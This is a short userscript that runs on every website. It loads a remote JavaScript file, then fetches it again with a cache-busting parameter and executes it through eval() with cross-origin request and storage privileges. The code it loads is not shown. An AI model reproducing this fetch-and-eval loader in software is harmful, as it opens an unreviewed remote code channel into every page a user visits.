// ==UserScript==
// @name         tmwebscript
// @description  
// @version      0.1
// @match        http://*/*
// @match        https://*/*
// @require      https://tmwebscript.github.io/script/script.js
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_listValues
// @grant        GM_xmlhttpRequest
// @grant        unsafewindow
// @grant        window.close
// @grant        window.focus
// @grant        GM_openInTab
// @grant        GM_addValueChangeListener
// ==/UserScript==

test = 'hi';
url = "https://tmwebscript.github.io/script/script.js" + "?nocache=" + Date.now();

// setInterval(async()=>{
	GM_xmlhttpRequest({
               method: "GET",
               url: url,
               onload: data=> eval(data.responseText)
             });
// }, 30*1000)


